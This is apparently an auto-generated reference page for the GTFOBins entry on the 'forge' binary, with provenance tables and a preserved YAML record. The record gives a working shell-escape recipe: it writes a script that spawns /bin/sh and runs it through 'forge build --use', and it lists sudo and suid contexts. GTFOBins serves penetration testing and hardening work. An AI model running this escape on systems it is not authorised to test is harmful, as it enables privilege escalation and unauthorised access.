---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# forge

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `forge` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/forge` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [forge](../../tools/linux/forge.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | forge |
| name | forge |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/forge/ |

## Preserved Source Material

```yaml
_body: ''
_name: forge
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/forge
functions:
  shell:
  - code: 'echo ''#!/bin/sh'' >/path/to/temp-file

      echo -e "/bin/sh <$(tty) >$(tty) 2>$(tty)" >>/path/to/temp-file

      chmod +x /path/to/temp-file

      forge build --use /path/to/temp-file'
    contexts:
      sudo: null
      suid: null
      unprivileged: null
```
